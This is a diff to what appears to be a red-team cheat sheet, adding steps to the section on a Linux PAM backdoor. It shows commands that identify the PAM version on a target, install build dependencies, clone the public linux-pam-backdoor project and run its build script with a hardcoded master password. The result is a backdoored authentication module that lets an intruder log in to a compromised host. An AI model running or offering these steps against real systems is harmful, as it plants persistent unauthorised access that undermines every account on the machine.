@@ -216,8 +216,15 @@ https://github.com/dnSpy/dnSpy
 # linux PAM module backdoor password build script
 https://github.com/zephrax/linux-pam-backdoor
 ```bash
+## determine pam version on target
+### debian
+dpkg -l | grep pam
+### centos / redhat / RHEL
+rpm -qa | grep pam
+
 sudo apt install -y autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc
 git clone https://github.com/zephrax/linux-pam-backdoor
 cd linux-pam-backdoor
+
 ./backdoor.sh -v 1.5.1 -p password1234
 ```
